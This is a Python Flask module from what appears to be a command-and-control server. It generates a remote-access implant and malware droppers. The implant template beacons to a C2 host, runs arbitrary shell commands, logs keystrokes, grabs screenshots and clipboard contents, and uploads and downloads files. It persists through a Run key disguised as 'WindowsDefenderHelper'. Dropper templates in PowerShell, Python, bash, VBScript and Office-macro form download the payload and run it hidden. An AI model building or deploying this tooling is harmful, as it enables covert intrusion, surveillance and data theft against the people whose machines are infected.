import os
from flask import Blueprint, render_template, request, jsonify, current_app
from routes.auth import require_login

generator_bp = Blueprint('generator', __name__)

# ── Agent template ─────────────────────────────────────────────────────────────
# Self-contained single-file agent with all security hardening baked in.
# Generator substitutes config values; operators get a ready-to-deploy file.

_AGENT_TEMPLATE = '''\
"""
Generated C2 Agent
C2 Server : {C2_SERVER}
Interval  : {BEACON_INTERVAL}s +/- {JITTER}s jitter
Encrypted : {ENCRYPTED}
Generated : {GENERATED_AT}
"""

import os, sys, ssl, hashlib, time, random, socket, platform
import subprocess, base64, uuid, json, threading
import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Config ────────────────────────────────────────────────────────────────────
C2_SERVER        = "{C2_SERVER}"
API_KEY          = "{API_KEY}"
BEACON_INTERVAL  = {BEACON_INTERVAL}
JITTER           = {JITTER}
USER_AGENT       = "{USER_AGENT}"
ENCRYPT_BEACON   = {ENCRYPT_BEACON}
ENCRYPTION_KEY   = "{ENCRYPTION_KEY}"
CERT_FINGERPRINT = "{CERT_FINGERPRINT}"

# ── Agent identity (random UUID — not MAC address) ────────────────────────────
def _get_or_create_agent_id():
    base = os.environ.get("APPDATA") or os.environ.get("HOME") or "/tmp"
    id_file = os.path.join(base, ".wdhlp")
    try:
        with open(id_file, "r") as f:
            aid = f.read().strip()
            if len(aid) == 36:
                return aid
    except FileNotFoundError:
        pass
    aid = str(uuid.uuid4())
    try:
        with open(id_file, "w") as f:
            f.write(aid)
    except OSError:
        pass
    return aid

AGENT_ID = _get_or_create_agent_id()

# ── Session state ─────────────────────────────────────────────────────────────
_session_key   = None
_session_token = None
_registered    = False

def _get_headers():
    return {{
        "X-Beacon-Token": _session_token or API_KEY,
        "X-Agent-ID":     AGENT_ID,
        "User-Agent":     USER_AGENT,
    }}

# ── ECDH key exchange ─────────────────────────────────────────────────────────
def _ecdh_generate():
    from cryptography.hazmat.primitives.asymmetric.ec import generate_private_key, SECP256R1
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    priv = generate_private_key(SECP256R1())
    pub_hex = priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo).hex()
    return priv, pub_hex

def _ecdh_derive(priv, peer_pub_hex):
    from cryptography.hazmat.primitives.asymmetric.ec import ECDH
    from cryptography.hazmat.primitives.serialization import load_der_public_key
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    peer_pub = load_der_public_key(bytes.fromhex(peer_pub_hex))
    shared   = priv.exchange(ECDH(), peer_pub)
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b"c2-session-key").derive(shared).hex()

# ── AES-256-CBC ───────────────────────────────────────────────────────────────
def _encrypt_with_key(payload, key_hex):
    if not ENCRYPT_BEACON:
        return None, json.dumps(payload).encode()
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    key = bytes.fromhex(key_hex)
    iv  = os.urandom(16)
    raw = json.dumps(payload).encode()
    pad = 16 - len(raw) % 16
    raw += bytes([pad] * pad)
    enc = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
    ct  = enc.update(raw) + enc.finalize()
    return "text/plain", base64.b64encode(iv + ct).decode().encode()

def _decrypt_with_key(text, key_hex):
    if not ENCRYPT_BEACON:
        return json.loads(text)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(text)
    iv, ct = raw[:16], raw[16:]
    dec = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).decryptor()
    pt  = dec.update(ct) + dec.finalize()
    return json.loads(pt[:-pt[-1]].decode())

# ── Certificate pinning ───────────────────────────────────────────────────────
def _verify_cert_fingerprint():
    fp = CERT_FINGERPRINT
    if not fp or fp == "REPLACE_WITH_gen_cert_OUTPUT":
        return True
    try:
        from urllib.parse import urlparse
        parsed = urlparse(C2_SERVER)
        host, port = parsed.hostname, (parsed.port or 443)
        pem    = ssl.get_server_certificate((host, port))
        der    = ssl.PEM_cert_to_DER_cert(pem)
        return hashlib.sha256(der).hexdigest() == fp
    except Exception:
        return False

# ── Transport ─────────────────────────────────────────────────────────────────
def _post_bootstrap(path, payload):
    ct, body = _encrypt_with_key(payload, ENCRYPTION_KEY)
    hdrs = dict(_get_headers())
    if ct: hdrs["Content-Type"] = ct
    r = requests.post(C2_SERVER + path, data=body, headers=hdrs, timeout=10, verify=False)
    return _decrypt_with_key(r.text, ENCRYPTION_KEY)

def _post(path, payload):
    ct, body = _encrypt_with_key(payload, _session_key)
    hdrs = dict(_get_headers())
    if ct: hdrs["Content-Type"] = ct
    r = requests.post(C2_SERVER + path, data=body, headers=hdrs, timeout=10, verify=False)
    return _decrypt_with_key(r.text, _session_key)

def _get(path):
    r = requests.get(C2_SERVER + path, headers=_get_headers(), timeout=10, verify=False)
    return _decrypt_with_key(r.text, _session_key) if ENCRYPT_BEACON else r.json()

# ── System info ───────────────────────────────────────────────────────────────
def sysinfo():
    try: ip = socket.gethostbyname(socket.gethostname())
    except: ip = "unknown"
    return dict(agent_id=AGENT_ID, hostname=socket.gethostname(), ip=ip,
                os=platform.system(), os_version=platform.version(),
                username=os.getenv("USERNAME") or os.getenv("USER") or "unknown")

# ── Commands ──────────────────────────────────────────────────────────────────
def run_shell(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired: return "[TIMEOUT]"
    except Exception as e: return f"[ERROR] {{e}}"

def get_screenshot():
    try:
        from PIL import ImageGrab
        import io
        buf = io.BytesIO()
        ImageGrab.grab().save(buf, "PNG")
        return "[SCREENSHOT_B64]" + base64.b64encode(buf.getvalue()).decode()
    except Exception as e: return f"[ERROR] {{e}}"

def get_clipboard():
    return run_shell("powershell -command Get-Clipboard")

def get_netstat():
    return run_shell("netstat -ano")

def get_arp():
    return run_shell("arp -a")

def get_privs():
    out   = run_shell("whoami /priv")
    admin = run_shell("net session >nul 2>&1 && echo ADMIN || echo NOT_ADMIN")
    return f"{{out}}\\n\\nAdmin check: {{admin}}"

def download_file(path):
    try:
        with open(path.strip(), "rb") as f: d = f.read()
        return f"[FILE_B64 path={{path.strip()}}]" + base64.b64encode(d).decode()
    except Exception as e: return f"[ERROR] {{e}}"

def upload_file(args):
    parts = args.split(" ", 1)
    if len(parts) != 2: return "[ERROR] Usage: upload <path> <b64data>"
    path, b64 = parts
    try:
        with open(path.strip(), "wb") as f: f.write(base64.b64decode(b64))
        return f"[OK] Written to {{path.strip()}}"
    except Exception as e: return f"[ERROR] {{e}}"

# ── Keylogger ─────────────────────────────────────────────────────────────────
_klog_active = False
_klog_buffer = []

def klog_start():
    global _klog_active, _klog_buffer
    try:
        from pynput import keyboard
        _klog_active = True
        _klog_buffer = []
        def on_press(key):
            if not _klog_active: return False
            try: _klog_buffer.append(key.char or "")
            except: _klog_buffer.append(f"[{{key.name}}]")
        threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start(), daemon=True).start()
        return "[OK] Keylogger started"
    except ImportError: return "[ERROR] pynput not installed"

def klog_stop():
    global _klog_active
    _klog_active = False
    return "[OK] Keylogger stopped"

def klog_dump():
    data = "".join(_klog_buffer)
    _klog_buffer.clear()
    return data or "(no keystrokes captured)"

# ── Persistence ───────────────────────────────────────────────────────────────
def persist_add():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsDefenderHelper", 0, winreg.REG_SZ,
                          f\'{{sys.executable}} "{{os.path.abspath(__file__)}}"\')
        winreg.CloseKey(key)
        return "[OK] Persistence added (HKCU Run key: WindowsDefenderHelper)"
    except Exception as e: return f"[ERROR] {{e}}"

def persist_remove():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsDefenderHelper")
        winreg.CloseKey(key)
        return "[OK] Persistence removed"
    except Exception as e: return f"[ERROR] {{e}}"

# ── Dispatcher ────────────────────────────────────────────────────────────────
def dispatch(command):
    cmd = command.strip()
    if cmd.startswith("shell "):      return run_shell(cmd[6:])
    if cmd == "sysinfo":              return "\\n".join(f"{{k:<14}}: {{v}}" for k,v in sysinfo().items())
    if cmd == "screenshot":           return get_screenshot()
    if cmd == "clipboard":            return get_clipboard()
    if cmd == "netstat":              return get_netstat()
    if cmd == "arp":                  return get_arp()
    if cmd == "privs":                return get_privs()
    if cmd.startswith("download "):   return download_file(cmd[9:])
    if cmd.startswith("upload "):     return upload_file(cmd[7:])
    if cmd.startswith("sleep "):
        global BEACON_INTERVAL
        try: BEACON_INTERVAL = int(cmd[6:]); return f"[OK] Interval set to {{BEACON_INTERVAL}}s"
        except: return "[ERROR] Usage: sleep <seconds>"
    if cmd == "keylogger start":      return klog_start()
    if cmd == "keylogger stop":       return klog_stop()
    if cmd == "keylogger dump":       return klog_dump()
    if cmd == "persist add":          return persist_add()
    if cmd == "persist remove":       return persist_remove()
    if cmd == "kill":                 return "[KILL] Terminating."
    return run_shell(cmd)

# ── Beacon loop ───────────────────────────────────────────────────────────────
def jitter_sleep():
    time.sleep(max(5, BEACON_INTERVAL + random.randint(-JITTER, JITTER)))

def _try_register():
    global _registered, _session_key, _session_token
    try:
        agent_priv, agent_pub_hex = _ecdh_generate()
        info = sysinfo()
        info["ecdh_public_key"] = agent_pub_hex
        resp = _post_bootstrap("/beacon/register", info)
        _session_key   = _ecdh_derive(agent_priv, resp["ecdh_public_key"])
        _session_token = resp.get("session_token")
        _registered    = True
        return True
    except Exception:
        return False

def _try_beacon():
    global _registered
    if not _registered:
        if not _try_register(): return
    try:
        resp = _get("/beacon/task")
        if resp.get("command"):
            out = dispatch(resp["command"])
            _post("/beacon/result", {{"task_id": resp["task_id"], "output": out}})
            if resp["command"].strip() == "kill":
                sys.exit(0)
    except Exception:
        _registered = False

def main():
    if not _verify_cert_fingerprint():
        sys.exit(1)
    backoff = 5
    while not _try_register():
        time.sleep(backoff + random.uniform(0, 3))
        backoff = min(backoff * 2, 60)
    while True:
        try: _try_beacon()
        except Exception: pass
        jitter_sleep()

if __name__ == "__main__":
    main()
'''


@generator_bp.route('/generator')
@require_login
def generator():
    return render_template('generator.html',
                           default_server=request.host_url.rstrip('/'),
                           default_key=current_app.config['API_KEY'],
                           default_enc_key=current_app.config['ENCRYPTION_KEY'])


# ── Dropper templates ──────────────────────────────────────────────────────────

_DROPPERS = {
    'powershell': {
        'label': 'PowerShell Cradle',
        'os':    'Windows',
        'ext':   'ps1',
        'template': (
            "# PowerShell Dropper — download and execute agent\n"
            "$ErrorActionPreference='SilentlyContinue'\n"
            "[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}}\n"
            "$u='{PAYLOAD_URL}'; $o=\"$env:TEMP\\{FILENAME}\"\n"
            "(New-Object Net.WebClient).DownloadFile($u,$o)\n"
            "Start-Process '{INTERPRETER}' -ArgumentList $o -WindowStyle Hidden"
        ),
    },
    'powershell_oneliner': {
        'label': 'PowerShell One-liner',
        'os':    'Windows',
        'ext':   'txt',
        'template': (
            "[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};"
            "(New-Object Net.WebClient).DownloadFile('{PAYLOAD_URL}',\"$env:TEMP\\{FILENAME}\");"
            "Start-Process '{INTERPRETER}' -ArgumentList \"$env:TEMP\\{FILENAME}\" -WindowStyle Hidden"
        ),
    },
    'python': {
        'label': 'Python Bootstrap',
        'os':    'Cross-platform',
        'ext':   'py',
        'template': (
            "import urllib.request,ssl,os,sys,subprocess,threading\n"
            "def _drop():\n"
            "    ctx=ssl._create_unverified_context()\n"
            "    p=os.path.join(os.environ.get('TEMP','/tmp'),'{FILENAME}')\n"
            "    urllib.request.urlretrieve('{PAYLOAD_URL}',p,context=ctx)\n"
            "    subprocess.Popen([sys.executable,p],close_fds=True,\n"
            "        stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n"
            "threading.Thread(target=_drop,daemon=True).start()"
        ),
    },
    'bash': {
        'label': 'Bash Stager',
        'os':    'Linux / macOS',
        'ext':   'sh',
        'template': (
            "#!/bin/bash\n"
            "P=\"/tmp/.{FILENAME}\"\n"
            "curl -sk '{PAYLOAD_URL}' -o \"$P\" || "
            "wget -q --no-check-certificate '{PAYLOAD_URL}' -O \"$P\"\n"
            "chmod +x \"$P\"\n"
            "nohup {INTERPRETER} \"$P\" >/dev/null 2>&1 &"
        ),
    },
    'vbscript': {
        'label': 'VBScript Dropper',
        'os':    'Windows (legacy)',
        'ext':   'vbs',
        'template': (
            "' VBScript Dropper\n"
            "Dim oHttp, oFso, oFile, sPath\n"
            "sPath = Environ(\"TEMP\") & \"\\{FILENAME}\"\n"
            "Set oHttp = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n"
            "oHttp.Open \"GET\", \"{PAYLOAD_URL}\", False\n"
            "oHttp.setOption 2, 13056\n"
            "oHttp.Send\n"
            "Set oFso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "Set oFile = oFso.OpenTextFile(sPath, 2, True)\n"
            "oFile.Write oHttp.ResponseText\n"
            "oFile.Close\n"
            "CreateObject(\"WScript.Shell\").Run \"{INTERPRETER} \" & sPath, 0, False"
        ),
    },
    'macro': {
        'label': 'VBA Macro (Office)',
        'os':    'Windows',
        'ext':   'vba',
        'template': (
            "' Paste into Excel/Word VBA editor (Alt+F11)\n"
            "Sub AutoOpen()\n"
            "    DropAndRun\n"
            "End Sub\n"
            "Sub Document_Open()\n"
            "    DropAndRun\n"
            "End Sub\n"
            "Sub DropAndRun()\n"
            "    Dim sUrl As String, sPath As String\n"
            "    sUrl  = \"{PAYLOAD_URL}\"\n"
            "    sPath = Environ(\"TEMP\") & \"\\{FILENAME}\"\n"
            "    Dim oHttp As Object\n"
            "    Set oHttp = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n"
            "    oHttp.Open \"GET\", sUrl, False\n"
            "    oHttp.setOption 2, 13056\n"
            "    oHttp.Send\n"
            "    Dim oFso As Object\n"
            "    Set oFso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "    Dim oFile As Object\n"
            "    Set oFile = oFso.OpenTextFile(sPath, 2, True)\n"
            "    oFile.Write oHttp.ResponseText\n"
            "    oFile.Close\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            "    oShell.Run \"{INTERPRETER} \" & sPath, 0, False\n"
            "End Sub"
        ),
    },
}


@generator_bp.route('/api/dropper', methods=['POST'])
@require_login
def generate_dropper():
    data         = request.get_json()
    dropper_type = data.get('type', 'powershell')
    payload_url  = data.get('payload_url', '').rstrip('/')
    filename     = data.get('filename', 'update_helper.py')
    interpreter  = data.get('interpreter', 'python')

    tmpl = _DROPPERS.get(dropper_type)
    if not tmpl:
        return jsonify({'error': 'Unknown dropper type'}), 400

    code = tmpl['template'].format(
        PAYLOAD_URL=payload_url, FILENAME=filename, INTERPRETER=interpreter,
    )
    return jsonify({'code': code, 'label': tmpl['label'], 'os': tmpl['os'], 'ext': tmpl['ext']})


@generator_bp.route('/api/generate', methods=['POST'])
@require_login
def generate():
    from datetime import datetime
    data = request.get_json()

    c2_server       = data.get('c2_server', 'http://127.0.0.1:5000').rstrip('/')
    api_key         = data.get('api_key', current_app.config['API_KEY'])
    beacon_interval = int(data.get('beacon_interval', 30))
    jitter          = int(data.get('jitter', 10))
    user_agent      = data.get('user_agent',
                               'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                               'AppleWebKit/537.36 (KHTML, like Gecko) '
                               'Chrome/124.0.0.0 Safari/537.36')
    encrypt         = data.get('encrypt', True)
    enc_key         = data.get('encryption_key', current_app.config['ENCRYPTION_KEY'])

    # Embed cert fingerprint for certificate pinning — read from server directory
    fp_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'cert_fingerprint.txt')
    try:
        with open(fp_path, 'r') as f:
            cert_fingerprint = f.read().strip()
    except FileNotFoundError:
        cert_fingerprint = "REPLACE_WITH_gen_cert_OUTPUT"

    code = _AGENT_TEMPLATE.format(
        C2_SERVER        = c2_server,
        API_KEY          = api_key,
        BEACON_INTERVAL  = beacon_interval,
        JITTER           = jitter,
        USER_AGENT       = user_agent,
        ENCRYPT_BEACON   = 'True' if encrypt else 'False',
        ENCRYPTION_KEY   = enc_key if encrypt else '',
        ENCRYPTED        = 'AES-256-CBC + ECDH forward secrecy' if encrypt else 'disabled',
        GENERATED_AT     = datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC'),
        CERT_FINGERPRINT = cert_fingerprint,
    )
    return jsonify({'code': code})
